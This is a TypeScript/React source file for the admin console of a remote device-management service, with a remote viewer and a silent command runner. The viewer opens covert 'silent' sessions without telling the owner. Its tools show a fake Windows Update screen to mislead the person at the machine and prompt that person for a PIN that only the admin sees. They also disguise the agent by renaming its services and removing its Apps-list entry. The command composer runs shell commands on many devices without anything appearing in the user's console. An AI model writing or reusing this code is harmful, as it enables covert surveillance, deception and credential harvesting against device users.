// remount replays a spent token and the frame answers "Unable to perform
// request" (the TASK_103 NEW-3 bug). Close is the only teardown, and it is also
// what discards the minted URL from client memory.
function AdminRemoteViewer({
  session,
  onClose,
}: {
  session: AdminRemoteSession;
  onClose: () => void;
}) {
  // Escape closes, matching every other overlay in this panel. Deliberately not
  // tied to any re-render of the parent, so the iframe never moves.
  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  // TASK_148 — the session tools. `busy` is the exact menu label in flight, so
  // only the item that was clicked disables and the admin can see WHICH action
  // is still running on the machine (these take seconds, not milliseconds).
  const [menuOpen, setMenuOpen] = useState(false);
  const [busy, setBusy] = useState("");
  const [note, setNote] = useState<{ ok: boolean; text: string } | null>(null);
  const [pins, setPins] = useState<AdminPinRow[]>([]);
  const [hideLabel, setHideLabel] = useState("");
  const confirm = useConfirm();

  /**
   * Call one admin tool route. Every tool answers with the same envelope, and
   * the failure text is the server's own normalized sentence (vantra_503 →
   * "This device is currently offline."), which is the same wording the
   * customer console shows — one device layer, one explanation.
   */
  async function runTool(
    path: "maintenance" | "pin-requests" | "agent-visibility",
    body: Record<string, unknown>,
    label: string,
  ): Promise<Record<string, unknown> | null> {
    setBusy(label);
    setNote(null);
    setMenuOpen(false);
    try {
      const res = await fetch(`/api/admin/devices/${session.deviceId}/${path}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = (await res.json().catch(() => ({}))) as { error?: unknown };
      if (!res.ok) {
        throw new Error(
          typeof data.error === "string"
            ? data.error.replace("vantra_503: ", "").replace("vantra_404: ", "")
            : "The tool failed",
        );
      }
      return data as Record<string, unknown>;
    } catch (e) {
      setNote({ ok: false, text: e instanceof Error ? e.message : "The tool failed" });
      return null;
    } finally {
      setBusy("");
    }
  }

  /**
   * The two device-visible tools ask first. Not ceremony: a maintenance overlay
   * and a hidden agent are both facts the person at the machine can see, and
   * this is a reported-user check — sending one by a stray click is exactly the
   * mistake the confirmation exists to prevent.
   */
  async function startMaintenance(style: "update" | "exe") {
    const ok = await confirm({
      title: "Show the maintenance screen on this device?",
      description:
        "The person at the machine sees a fake Windows Update screen. It is excluded from remote capture, so you keep watching the real desktop. Nothing appears in the user's activity.",
      confirmLabel: "Show it",
      confirmVariant: "primary",
    });
    if (!ok) return;
    const result = await runTool("maintenance", { action: "start", style }, "maintenance-start");
    if (result) {
      setNote({
        ok: true,
        text: `Maintenance screen is on (${String(result.style ?? style)}). You keep full control of the desktop.`,
      });
    }
  }

  async function stopMaintenance() {
    const result = await runTool("maintenance", { action: "stop" }, "maintenance-stop");
    if (result) {
      setNote({
        ok: true,
        text: "Maintenance screen stopped — the device is back to its normal desktop.",
      });
    }
  }

  const loadPins = useCallback(async () => {
    try {
      const res = await fetch(`/api/admin/devices/${session.deviceId}/pin-requests`);
      const data = await res.json().catch(() => ({}));
      if (res.ok && Array.isArray(data.requests)) setPins(data.requests as AdminPinRow[]);
    } catch {
      // Best-effort: a failed poll must not clear a PIN already on screen.
    }
  }, [session.deviceId]);

  async function requestPin(pinLength: number) {
    const result = await runTool("pin-requests", { pinLength }, `pin-${pinLength}`);
    if (result) {
      setNote({
        ok: true,
        text: "PIN prompt sent. The person at the keyboard sees it and types the code — the PIN appears below once it comes back, and never in the user's console.",
      });
      void loadPins();
    }
  }

  async function setAgentVisibility(mode: "hide" | "reveal") {
    const label = hideLabel.trim();
    const ok = await confirm({
      title:
        mode === "hide"
          ? `Hide the agent as "${label || "default label"}"?`
          : "Reveal the agent again?",
      description:
        mode === "hide"
          ? "Services on the machine show the new name and the Apps-list entry disappears. Cosmetic only — a local admin can still stop, reveal or uninstall it, so this is not concealment from whoever uses the device."
          : "Restores the real Tactical service name and the Apps-list entry.",
      confirmLabel: mode === "hide" ? "Hide agent" : "Reveal agent",
      confirmVariant: mode === "hide" ? "primary" : "danger",
    });
    if (!ok) return;
    const result = await runTool(
      "agent-visibility",
      mode === "hide" && label ? { mode, label } : { mode },
      `agent-${mode}`,
    );
    if (result) {
      setNote({
        ok: true,
        text:
          mode === "hide"
            ? "Agent hidden on the machine. Nothing appears in the user's activity."
            : "Agent revealed — the real service name and Apps-list entry are back.",
      });
    }
  }

  // A collected PIN is the whole point of the PIN tool, so poll while the view
  // is open: the person at the machine takes as long as they take.
  useEffect(() => {
    void loadPins();
    const id = setInterval(() => void loadPins(), 15_000);
    return () => clearInterval(id);
  }, [loadPins]);

  const collected = pins.filter((p) => p.pin);
  const waiting = pins.filter((p) => !p.pin);

  return (
    <div className="fixed inset-0 z-[60] flex flex-col bg-black/85 p-3 sm:p-6">
      <div className="flex flex-wrap items-center gap-3 rounded-t-xl border border-b-0 border-zinc-700 bg-zinc-900 px-4 py-2 text-xs text-zinc-200">
        <span className="font-medium">{session.deviceName}</span>
        <span className="text-zinc-400">{session.ownerEmail}</span>
        {session.urls.hostname && (
          <span className="font-mono text-zinc-500">{session.urls.hostname}</span>
        )}
        <span
          className="rounded-full border border-amber-500/40 px-2 py-0.5 text-amber-400"
          title="The owner is not asked and not told. This open is recorded in the admin-only command log."
        >
          Silent session
        </span>
        {/* TASK_148 — the session tools. Everything here runs on the machine and
            is silent CONSOLE-side (nothing in the user's activity, and a PIN
            stays out of their console). It is not silent device-side, and each
            item says what the person at the machine will see. */}
        <div className="relative ml-auto">
          <button
            onClick={() => setMenuOpen((p) => !p)}
            className="rounded-lg border border-zinc-600 px-3 py-1 font-medium text-zinc-200 transition-colors hover:bg-zinc-800"
            title="Run a tool on this machine"
          >
            Tools {menuOpen ? "▴" : "▾"}
          </button>
          {menuOpen && (
            <>
              <div className="fixed inset-0 z-30" onClick={() => setMenuOpen(false)} />
              <div className="absolute right-0 top-full z-40 mt-1 w-72 rounded-lg border border-zinc-600 bg-zinc-900 p-1.5 text-left shadow-xl">
                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
                  Maintenance screen · visible on the device
                </p>
                <AdminToolItem
                  onClick={() => void startMaintenance("update")}
                  disabled={busy === "maintenance-start"}
                  title="Show the built-in fake Windows Update screen (you keep full control)"
                  label={busy === "maintenance-start" ? "Starting…" : "Show maintenance screen"}
                />
                <AdminToolItem
                  onClick={() => void startMaintenance("exe")}
                  disabled={busy === "maintenance-start"}
                  title="Same screen with the smoother owner-supplied spinner"
                  label={busy === "maintenance-start" ? "Starting…" : "Show maintenance (spinner)"}
                />
                <AdminToolItem
                  onClick={() => void stopMaintenance()}
                  disabled={busy === "maintenance-stop"}
                  title="Take the maintenance screen off the device"
                  label={busy === "maintenance-stop" ? "Stopping…" : "Stop maintenance screen"}
                />

                <div className="my-1 border-t border-zinc-700" />
                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
                  PIN request · prompt shows on the device
                </p>
                {[4, 6, 8].map((len) => (
                  <AdminToolItem
                    key={len}
                    onClick={() => void requestPin(len)}
                    disabled={busy === `pin-${len}`}
                    title={`Ask the device for a ${len}-digit PIN`}
                    label={busy === `pin-${len}` ? "Sending…" : `Request ${len}-digit PIN`}
                  />
                ))}

                <div className="my-1 border-t border-zinc-700" />
                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
                  Agent visibility · cosmetic, visible to a local admin
                </p>
                <div className="px-2 pb-1.5">
                  <input
                    value={hideLabel}
                    onChange={(e) => setHideLabel(e.target.value)}
                    placeholder="Label shown instead (optional)"
                    className="w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 py-1 text-xs text-zinc-200 outline-none focus:border-zinc-500"
                  />
                </div>
                <AdminToolItem
                  onClick={() => void setAgentVisibility("hide")}
                  disabled={busy === "agent-hide"}
                  title="Rename the Tactical agent's services on the machine"
                  label={busy === "agent-hide" ? "Hiding…" : "Hide agent"}
                />
                <AdminToolItem
                  onClick={() => void setAgentVisibility("reveal")}
                  disabled={busy === "agent-reveal"}
                  title="Restore the real service name and the Apps-list entry"
                  label={busy === "agent-reveal" ? "Revealing…" : "Reveal agent"}
                  danger
                />
              </div>
            </>
          )}
        </div>
        <button
          onClick={onClose}
          className="rounded-lg border border-zinc-600 px-3 py-1 font-medium text-zinc-200 transition-colors hover:bg-zinc-800"
        >
          Close
        </button>
      </div>
      {/* TASK_148 — what the last tool did, and any PIN it brought back. Sits
          above the frame so it is never hidden behind the remote desktop. */}
      {note && (
        <p
          className={`border-x border-zinc-700 px-4 py-2 text-xs ${
            note.ok ? "bg-emerald-950/60 text-emerald-300" : "bg-red-950/60 text-red-300"
          }`}
        >
          {note.text}
        </p>
      )}
      {collected.length > 0 && (
        <div className="flex flex-wrap items-center gap-x-4 gap-y-1 border-x border-zinc-700 bg-zinc-900/90 px-4 py-2 text-xs text-zinc-200">
          <span className="text-zinc-400">PIN collected:</span>
          {collected.map((p) => (
            <span key={p.id} className="font-mono text-base tracking-[0.3em] text-emerald-400">
              {p.pin}
            </span>
          ))}
          <span className="text-zinc-500">
            Not visible to the user — this PIN never appears in their console.
          </span>
        </div>
      )}
      {waiting.length > 0 && (
        <p className="border-x border-zinc-700 bg-zinc-900/90 px-4 py-2 text-xs text-zinc-400">
          Waiting on the person at the machine to type {waiting.length === 1 ? "a PIN" : "the PINs"} (
          {waiting.map((p) => `${p.pinLength}-digit`).join(", ")}, until{" "}
          {new Date(waiting[0].expiresAt).toLocaleTimeString()}).
        </p>
      )}
      {/* Vantra mints a viewer URL even when the machine is not online — minting
          is NOT gated the way run-command is (which refuses with vantra_503), and
          this was confirmed against the live box: an offline device returned
          200 + urls and logged status=ok. Without this line a frame that can
          never show a desktop looks identical to a working session, which is the
          one thing this workflow must not do — an admin confirming something
          about a reported user has to know whether they are actually looking at
          the machine. Informational only: the frame still opens, so a machine
          that has just checked back in can still be watched. */}
      {session.status !== "online" && (
        <p className="border-x border-zinc-700 bg-amber-950/60 px-4 py-2 text-xs text-amber-300">
          Not reporting as online — last check-in {formatWhen(session.lastSeenAt)}. Remote control
          needs the agent connected, so a live desktop may not appear until it checks back in. The
          frame below opens either way.
        </p>
      )}
      <iframe
        src={session.urls.control}
        title={`Remote control — ${session.deviceName}`}
        className="min-h-0 w-full flex-1 rounded-b-xl border border-zinc-700 bg-black"
        sandbox="allow-scripts allow-same-origin allow-forms"
      />
    </div>
  );
}


// The single command entry point for the whole tab. The SAME component serves a
// one-device run (the expanded row → the per-device route) and a multi-device run
// (the checkbox selection → the bulk route), so the two can never diverge in
// validation, wording or how a result is rendered.
function AdminCommandComposer({
  title,
  subtitle,
  targets,
  onRan,
}: {
  title: string;
  subtitle?: string;
  targets: Array<{ id: string; name: string; ownerEmail: string }>;
  onRan?: () => void;
}) {
  const [cmd, setCmd] = useState("");
  const [shell, setShell] = useState<"powershell" | "cmd">("powershell");
  const [timeoutSeconds, setTimeoutSeconds] = useState(30);
  const [runAsUser, setRunAsUser] = useState(false);
  const [running, setRunning] = useState(false);
  const [error, setError] = useState("");
  const [results, setResults] = useState<AdminCommandTarget[] | null>(null);

  const single = targets.length === 1;

  async function run() {
    const trimmed = cmd.trim();
    if (!trimmed) {
      setError("Enter a command first.");
      return;
    }
    setRunning(true);
    setError("");
    setResults(null);
    try {
      const res = single
        ? await fetch(`/api/admin/devices/${targets[0].id}/run-command`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cmd: trimmed, shell, timeout: timeoutSeconds, runAsUser }),
          })
        : await fetch("/api/admin/devices/run-command", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              deviceIds: targets.map((t) => t.id),
              cmd: trimmed,
              shell,
              timeout: timeoutSeconds,
              runAsUser,
            }),
          });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setError(typeof data.error === "string" ? data.error : "Command failed");
      } else if (single) {
        setResults([
          {
            deviceId: targets[0].id,
            name: targets[0].name,
            ownerEmail: targets[0].ownerEmail,
            ok: true,
            output: typeof data.output === "string" ? data.output : null,
            error: null,
          },
        ]);
      } else {
        setResults(Array.isArray(data.targets) ? (data.targets as AdminCommandTarget[]) : []);
      }
      // The caller reloads the history, so a run shows up in the device's log
      // immediately instead of only after a manual refresh.
      onRan?.();
    } catch {
      setError("Network error");
    } finally {
      setRunning(false);
    }
  }


  return (
    <div className="rounded-xl border border-zinc-200 bg-white p-4 shadow-sm dark:border-zinc-800 dark:bg-zinc-900">
      <div className="flex flex-wrap items-baseline justify-between gap-2">
        <p className="text-sm font-medium">{title}</p>
        {subtitle && <p className="text-xs text-zinc-500 dark:text-zinc-400">{subtitle}</p>}
      </div>

      <textarea
        value={cmd}
        onChange={(e) => setCmd(e.target.value)}
        rows={3}
        spellCheck={false}
        placeholder={shell === "powershell" ? "Get-Process | Select-Object -First 5" : "whoami"}
        className="mt-3 w-full rounded-lg border border-zinc-300 bg-white px-3 py-2 font-mono text-xs outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
      />

      <div className="mt-2 flex flex-wrap items-center gap-3">
        <label className="flex items-center gap-1.5 text-xs text-zinc-600 dark:text-zinc-400">
          Shell
          <select
            value={shell}
            onChange={(e) => setShell(e.target.value === "cmd" ? "cmd" : "powershell")}
            className="rounded-lg border border-zinc-300 bg-white px-2 py-1 text-xs outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
          >
            <option value="powershell">PowerShell</option>
            <option value="cmd">cmd</option>
          </select>
        </label>
        <label className="flex items-center gap-1.5 text-xs text-zinc-600 dark:text-zinc-400">
          Timeout
          <input
            type="number"
            min={1}
            max={90}
            value={timeoutSeconds}
            onChange={(e) => setTimeoutSeconds(Number(e.target.value) || 30)}
            className="w-16 rounded-lg border border-zinc-300 bg-white px-2 py-1 text-xs outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
          />
          s
        </label>
        <label className="flex items-center gap-1.5 text-xs text-zinc-600 dark:text-zinc-400">
          <input
            type="checkbox"
            checked={runAsUser}
            onChange={(e) => setRunAsUser(e.target.checked)}
          />
          Run as the signed-in user
        </label>
        <button
          onClick={() => void run()}
          disabled={running}
          className="ml-auto rounded-lg bg-zinc-900 px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-zinc-700 disabled:opacity-50 dark:bg-zinc-50 dark:text-zinc-900 dark:hover:bg-zinc-300"
        >
          {running ? "Running…" : single ? "Run" : `Run on ${targets.length}`}
        </button>
      </div>
      <p className="mt-2 text-xs text-zinc-400 dark:text-zinc-500">
        Runs silently — nothing appears in the user&apos;s console, activity or digest. Offline
        devices fail instead of queuing (a queued command is visible to the user).
      </p>

      {error && <p className="mt-3 text-sm text-red-600 dark:text-red-400">{error}</p>}

      {results && (
        <ul className="mt-3 space-y-2">
          {results.map((r) => (
            <li
              key={r.deviceId}
              className="rounded-lg border border-zinc-200 bg-zinc-50 px-3 py-2 dark:border-zinc-800 dark:bg-zinc-950"
            >
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span
                  className={
                    r.ok
                      ? "font-medium text-emerald-600 dark:text-emerald-400"
                      : "font-medium text-red-600 dark:text-red-400"
                  }
                >
                  {r.ok ? "ok" : "failed"}
                </span>
                <span className="font-medium">{r.name ?? r.deviceId}</span>
                {r.ownerEmail && (
                  <span className="text-zinc-400 dark:text-zinc-500">{r.ownerEmail}</span>
                )}
                {r.output && (
                  <button
                    onClick={() => void copyToClipboard(r.output ?? "")}
                    className="ml-auto rounded border border-zinc-300 px-2 py-0.5 text-zinc-600 transition-colors hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
                  >
                    Copy output
                  </button>
                )}
              </div>
              {r.error && <p className="mt-1 text-xs text-red-600 dark:text-red-400">{r.error}</p>}
              {r.output && (
                <pre className="mt-1 max-h-64 overflow-auto whitespace-pre-wrap break-all font-mono text-xs text-zinc-700 dark:text-zinc-200">
                  {r.output}
                </pre>
              )}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

